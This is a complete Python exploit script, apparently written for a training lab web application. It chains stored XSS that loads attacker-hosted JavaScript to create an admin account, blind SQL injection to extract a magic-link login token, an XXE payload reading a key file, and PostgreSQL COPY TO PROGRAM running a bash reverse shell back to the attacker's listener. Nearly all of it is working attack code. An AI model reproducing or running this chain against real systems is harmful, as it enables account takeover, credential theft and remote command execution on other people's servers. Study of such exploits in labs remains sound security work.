#!/usr/bin/env python3

import requests 
import http.server
import socketserver
import threading
import traceback
from urllib.parse import urljoin
import sys
import argparse
import re
from bs4 import BeautifulSoup

"""
Usage:
/usr/bin/python3 rce_script.py <target_base_url> <listener_IP> <listener_port>
"""

PROXY = {"http": "http://127.0.0.1:8080", "https": "https://127.0.0.1:8080"}

class Handler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        if self.path == "/crAdmin.js":
            self.send_response(200)
            self.send_header("Content-type", "application/javascript")
            self.end_headers()

            payload = b"""
            var http = new XMLHttpRequest();
            var url = '/admin/users/create';
            var params = 'name=randomusername&email=newadmin@user.ltd&isAdmin=true&isMod=true';
            http.open('POST', url, true);
            http.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
            http.send(params);
            """

            self.wfile.write(payload)

            # Shut down the server after serving this request
            threading.Thread(target=self.server.shutdown, daemon=True).start()
        else:
            self.send_error(404, "File not found")


def xss(target, lhost):
    xssUrl = urljoin(target, "/question")
    xssHeaders = {"Content-Type": "application/x-www-form-urlencoded"}
    xssData = {
        "title": "i love XSS",
        "description": f"a<script src=http://{lhost}/crAdmin.js></script>em>",
        "category": "1",
    }

    def run_server():
        with socketserver.TCPServer(("", 80), Handler) as httpd:
            print(f"[*] Serving on port 80, waiting for /crAdmin.js ...")
            httpd.serve_forever()
            print("[*] Server stopped.")

    # Start server in a background thread
    server_thread = threading.Thread(target=run_server, daemon=True)
    server_thread.start()

    # Deliver the XSS payload
    try:
        print("[*] Delivering the XSS attack...")
        xssRes = requests.post(xssUrl, headers=xssHeaders, data=xssData)
        if xssRes.status_code == 200:
            print("[+] XSS attack delivered successfully. Waiting for admin...")
        else:
            print(f"[-] Failed to deliver XSS (status {xssRes.status_code})")
    except Exception as e:
        print("[-] Error delivering the XSS attack: ", e)
        traceback.print_exc()

    # Keep main thread alive while server runs
    try:
        while server_thread.is_alive():
            server_thread.join(1)
    except KeyboardInterrupt:
        print("[*] Shutting down...")

def ExfilToken(target):
    """
    Check the XSS Attack 
    """
    chkXssUrl = urljoin(target, "/profile/9")
    chkXssRes = requests.get(chkXssUrl)
    if "randomusername" in chkXssRes.text and "Administrator" in chkXssRes.text:
        print("[+] XSS Attack Succeeded")
    else: 
        print("[-] XSS Attack Failed")
        sys.exit(1)
    """
    Request a magick link
    """
    ReqMgkLnkUrl = urljoin(target, "/generateMagicLink")
    ReqMgkLnkData = {"username": "randomusername"}
    try:
        ReqMgkLnkRes = requests.post(ReqMgkLnkUrl, data=ReqMgkLnkData)
        print("[+] Magicklink requested for user randomusername")
    except Exception as e:
        print("[-] Error requesting a magiclink: ", e)
    """
    Token Lenght 
    """
    length = 0
    while True:
        TknLenPayload = f"(SELECT CASE WHEN (SELECT LENGTH(token) FROM tokens WHERE user_id=9 LIMIT 1)={length} THEN (1) ELSE 1/(SELECT 0) END)"
        length = length +1 
        TknLenUrl = urljoin(target, f"/categories?order={TknLenPayload}")
        try:
            TknLenghtRes = requests.get(TknLenUrl)
            if TknLenghtRes.status_code == 200:
                print(f"[+] Magiclink token length: {length}")
                break
        except Exception as e:
            print("[-] Error exfiltrating the token length: ", e)
            traceback.print_exc()
    """
    Exfil Magicklink token
    """
    token = ""
    for pos in range(1, int(length) + 1):
        for ascii_code in range(32, 127):
            exfilTknPayload = f"(SELECT CASE WHEN (SELECT (ASCII(SUBSTRING(token,{pos},1))) FROM tokens WHERE user_id=9 LIMIT 1)={ascii_code} THEN (1) ELSE 1/(SELECT 0) END)"
            exfilTknUrl = urljoin(target, f"/categories?order={exfilTknPayload}")
            try:
                exfilTknRes = requests.get(exfilTknUrl)
                if exfilTknRes.status_code == 200:
                    sys.stdout.write(chr(ascii_code))
                    sys.stdout.flush()
                    token = token + chr(ascii_code)
            except Exception as e:
                print("[-] Error exfiltrating the token: ", e)
                traceback.print_exc()
    print("\n[+] Magiclink Token exfiltrated: ", token)
    return token

def login(target, MagiclinkToken):
    print("[*] Logging you in...")
    lgnUrl = urljoin(target, f"/magicLink/{MagiclinkToken}")
    try:
        lgnRes = requests.get(lgnUrl, allow_redirects=False)
        if 'Set-Cookie' in lgnRes.headers:
            cookie_header = lgnRes.headers['Set-Cookie']
            print(f"[+] Cookie: {cookie_header}")
            
            # Use regex instead of SimpleCookie for more reliable parsing
            match = re.search(r'JSESSIONID=([^;]+)', cookie_header)
            if match:
                JSESSIONID_value = match.group(1)
                if JSESSIONID_value:
                    print("[+] Logged in successfully")
                return JSESSIONID_value
            else:
                print("[-] Could not extract JSESSIONID from cookie")
            return None
    except Exception as e:
        print("[-] Error sending the login request: ", e)


def rce(target, lhost, lport, JSESSIONID):
    """ 
    XXE to read arbitrary file sytem (adminKey.txt) 
    """
    xxeUrl = urljoin(target, "/admin/import")
    cookies = {"JSESSIONID": JSESSIONID}
    headers = {"Content-Type": "application/x-www-form-urlencoded"}
    xxePayload = '<?xml version="1.0" encoding="UTF-8"?> <!DOCTYPE foo [<!ENTITY example SYSTEM "file:///home/student/adminkey.txt"> ]> <database><users><user><id>5</id><username>Carl</username><password>&example;</password><isAdmin>false</isAdmin><isMod>true</isMod><email>carl@answers.local</email></user></users></database>'
    xxeData = {"preview": "true", "xmldata": xxePayload}

    try:
        print("[*] Reading the adminKey.txt...")
        r = requests.post(xxeUrl, headers=headers, cookies=cookies, data=xxeData)
        soup = BeautifulSoup(r.text, "html.parser")
        pre = soup.find("pre")
        if not pre:
            print("[-] No <pre> block found in response")
            return

        m = re.search(r"<password>(.*?)</password>", pre.decode_contents(), re.DOTALL | re.IGNORECASE)
        if not m:
            print("[-] Could not extract <password>")
            return

        adminKey = m.group(1).strip()
        print("[+] adminKey:", adminKey)
        """
        RCE via PGSQL `COPY` function to execute system level commands 
        """
        # Trigger reverse shell
        print("[*] Invoking Reverse Shell...")
        rceUrl = urljoin(target, "/admin/query")
        rceData = {"adminKey": adminKey, "query": f"copy (select 'a') to program 'bash -c \"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1\"'"}
        res = requests.post(rceUrl, headers=headers, cookies=cookies, data=rceData)
        if res.status_code == 200:
            print("[+] Reverse Shell invoked. Check your listener!")
            print(f"[+] Listener {lhost}:{lport}")
        else:
            print(f"[-] RCE failed, status {res.status_code}")
    except Exception as e:
        print("[-] Error:", e)


def main():
    parser = argparse.ArgumentParser(description="XSS and SQLI for Authentication Bypass, XXE and PGSQL `COPY` function to execute system level commands")
    parser.add_argument("target", help="target's base URL (e.g, http://192.168.174.234:80/)")
    parser.add_argument("lhost", help="listener IP")
    parser.add_argument("lport", help="listener port")
    args = parser.parse_args()

    xss(args.target, args.lhost)
    mgklnkTkn = ExfilToken(args.target)
    if mgklnkTkn:
        JSESSIONID_cookie = login(args.target, mgklnkTkn)
        if JSESSIONID_cookie:
            rce(args.target, args.lhost, args.lport, JSESSIONID_cookie)
        else:
            print("[-] Failed to login")
    else:
        print("[-] Failed to steal magiclink token")

if __name__ == "__main__":
    main()
